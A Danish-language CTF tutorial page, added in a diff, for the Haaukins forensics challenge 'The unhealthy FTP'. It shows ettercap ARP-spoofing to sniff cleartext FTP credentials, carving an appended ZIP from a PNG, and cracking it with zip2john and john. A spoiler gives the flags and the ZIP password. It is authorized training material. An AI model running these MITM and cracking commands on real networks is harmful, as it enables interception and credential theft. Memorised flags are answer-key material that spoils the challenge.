@@ -1,0 +1,53 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: The unhealthy FTP — tutorial (file carving &amp; zip-crack)</title>
+<meta name="description" content="Guide til Haaukins The unhealthy FTP: sniff FTP-login, se flaget på et røntgenbillede, og carve en skjult krypteret ZIP ud af et billede med binwalk + zip2john.">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>The unhealthy FTP</h1>
+<p class="subtitle">Sniff FTP-login, se på billederne, og find en skjult ZIP gemt efter billedets slut.</p>
+<div class="badges"><span class="badge cat">Forensics</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+<div class="callout">📚 <strong>Baggrund:</strong> denne opgave bygger på en fælles teknik — læs primeren: <a href="arp-mitm.html">Primer: ARP-spoofing &amp; MITM</a>.</div>
+<h2>Hvad går opgaven ud på?</h2>
+<p>Læger deler røntgenbilleder via FTP (port 21, klartekst). Sniff login'et, log ind, og find
+             (1) et synligt flag og (2) skjult "malware" i billederne. To flag i alt.</p>
+<h2>Sniff &amp; log ind</h2>
+<pre><code>sudo ettercap -T -q -i eth0 -M arp:remote /&lt;ftp-server&gt;// ///
+#  FTP: ... USER: DoctorWillie  PASS: Ginnie2003</code></pre>
+             <p>FTP i docker fejler ofte i <em>passiv</em> mode (intern IP → hænger). Brug <strong>aktiv</strong> mode:</p>
+             <pre><code>curl -s -P - "ftp://DoctorWillie:Ginnie2003@&lt;server&gt;/"           # list filer
+curl -s -P - -O "ftp://DoctorWillie:Ginnie2003@&lt;server&gt;/xray5.png"</code></pre>
+<h2>Flag 1 — kig på billedet</h2>
+<p><code>flag.txt</code> er en decoy. <strong>Åbn billederne</strong> (<code>xdg-open xray3.png</code>):
+             flaget står skrevet direkte på røntgenet. Kig altid visuelt på udtrukne billeder — et flag kan være
+             synligt selv når stego-værktøjer intet finder.</p>
+<h2>Flag 2 — carve den skjulte ZIP</h2>
+<pre><code>binwalk xray5.png            # -> Zip archive data, encrypted, efter billedets slut
+dd if=xray5.png bs=1 skip=&lt;offset&gt; of=hidden.zip
+zip2john hidden.zip > zip.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash   # -> password
+unzip -P &lt;password&gt; hidden.zip</code></pre>
+             <p>Nogen har <em>appended</em> en ZIP efter PNG'ets IEND-markør — billedet vises normalt, men ekstra data
+             ligger bagved. <code>binwalk</code> finder den.</p>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<ul>
+        <li>-1 (synligt på xray3.png): <span class="flag">HKN{f7P-i5-n07-1n53cur3}</span></li>
+        <li>-2 (zip-password <code>birdie</code>): <span class="flag">HKN{W4lking-th3-fi13}</span></li>
+        </ul>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li>FTP-data i docker: hvis passiv hænger, brug aktiv mode (<code>curl -P -</code>).</li><li><code>binwalk</code> afslører filer gemt <em>efter</em> et billedes rigtige slut (file carving).</li><li><code>dd skip=&lt;offset&gt;</code> skærer filen ud; <code>zip2john</code>+john knækker ZIP-passwords.</li><li>Kig på billedet med øjnene — ikke kun med værktøjer.</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
